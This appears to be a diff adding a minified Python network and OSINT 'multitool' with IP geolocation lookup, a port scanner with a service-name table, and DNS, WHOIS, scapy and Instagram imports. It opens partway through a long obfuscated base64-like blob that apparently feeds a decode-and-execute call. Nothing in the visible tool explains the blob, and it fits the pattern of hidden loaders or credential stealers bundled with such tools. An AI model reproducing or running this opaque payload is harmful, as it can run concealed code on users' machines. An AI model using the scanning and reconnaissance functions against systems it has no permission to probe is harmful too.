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'))
+_e='partner'
+_d='system'
+_c='partners'
+_b='careers'
+_a='secure'
+_Z='search'
+_Y='asname'
+_X='regionName'
+_W='countryCode'
+_V='Unknown error'
+_U='Error:'
+_T='\x1b[0m'
+_S='service'
+_R='portal'
+_Q='test'
+_P='api'
+_O='forum'
+_N='putty'
+_M='cloud'
+_L='data'
+_K='region'
+_J='country'
+_I=False
+_H='lon'
+_G='lat'
+_F='support'
+_E='message'
+_D=None
+_C=True
+_B='status'
+_A='N/A'
+import requests,os,socket,subprocess,ipaddress
+from scapy.all import IP,ICMP,sr1,conf,sniff,IP,TCP,DNS,DNSQR
+import sys,dns.resolver,dns.reversename,whois
+from datetime import datetime
+import dns.resolver,dns.exception,dns.query,dns.zone,platform,socket,ssl
+from bs4 import BeautifulSoup
+import instaloader
+Dark_red='\x1b[38;2;170;0;0m'
+Dark_blue='\x1b[38;2;0;0;170m'
+Dark_aqua='\x1b[38;2;0;170;170m'
+Dark_purple='\x1b[38;2;170;0;170m'
+Dark_orange='\x1b[38;2;255;170;0m'
+Dark_gray='\x1b[38;2;85;85;85m'
+Dark_green='\x1b[38;2;0;170;0m'
+Black='\x1b[38;2;30;30;30m'
+Blue='\x1b[38;2;85;85;255m'
+Green='\x1b[38;2;85;255;85m'
+Aqua='\x1b[38;2;85;255;255m'
+Red='\x1b[38;2;255;85;85m'
+Purple='\x1b[38;2;255;85;255m'
+Yellow='\x1b[38;2;255;255;85m'
+White='\x1b[38;2;255;255;255m'
+Gray='\x1b[38;2;171;171;171m'
+Reset=_T
+def iplookup(ip):
+	B=f"http://demo.ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,asname,query&lang=en";C=requests.get(B);A=C.json()
+	if A.get(_B)=='fail':print(_U,A.get(_E,_V))
+	else:print('');print(f"{Dark_orange}IP Address    {White}>  {Dark_green}{A.get('query',_A)}");print(f"{Dark_orange}Country code  {White}>  {Dark_green}{A.get(_W,_A)}");print(f"{Dark_orange}Country       {White}>  {Dark_green}{A.get(_J,_A)}");print(f"{Dark_orange}Region code   {White}>  {Dark_green}{A.get(_K,_A)}");print(f"{Dark_orange}Region name   {White}>  {Dark_green}{A.get(_X,_A)}");print(f"{Dark_orange}City          {White}>  {Dark_green}{A.get('city',_A)}");print(f"{Dark_orange}Zip code      {White}>  {Dark_green}{A.get('zip',_A)}");print(f"{Dark_orange}ISP           {White}>  {Dark_green}{A.get('isp',_A)}");print(f"{Dark_orange}Organization  {White}>  {Dark_green}{A.get('org',_A)}");print(f"{Dark_orange}ASN           {White}>  {Dark_green}{A.get(_Y,_A)}");print(f"{Dark_orange}Latitude      {White}>  {Dark_green}{A.get(_G,_A)}");print(f"{Dark_orange}Longitude     {White}>  {Dark_green}{A.get(_H,_A)}");print(f"{Dark_orange}Location      {White}>  {Dark_green}{A.get(_G,_A)}, {A.get(_H,_A)}")
+def clear():os.system('cls')
+def port_scan(ip):
+	A='XBOX Live';D={1:'TCPMUX',5:'RJE',7:'ECHO',18:'MSP',20:'FTP DATA',21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',69:'TFTP',80:'HTTP',88:'Kerberos',102:'Iso-tsap',110:'POP3',115:'SFTP',119:'NNTP',123:'NTP',135:'RPC',137:'NetBIOS-ns',139:'NetBIOS',143:'IMAP',161:'SNMP',194:'IRC',381:'HP Openview',383:'HP Openview-data',443:'HTTPS',445:'SMB',465:'SMTPS',587:'Submission',593:'Microsoft DCOM',636:'LDAP',691:'MS Exchange',902:'VMware',993:'IMAPS',995:'POP3S',1194:'OpenVPN',1337:'WASTE',1433:'MSSQL',1589:'CISCO VQP',1725:'STEAM',2082:'cPanel',2083:'radsec',2967:'symantec AV',3074:A,3076:A,3306:'MySQL',3389:'Remote Desktop',3724:'WoW',4664:'Google 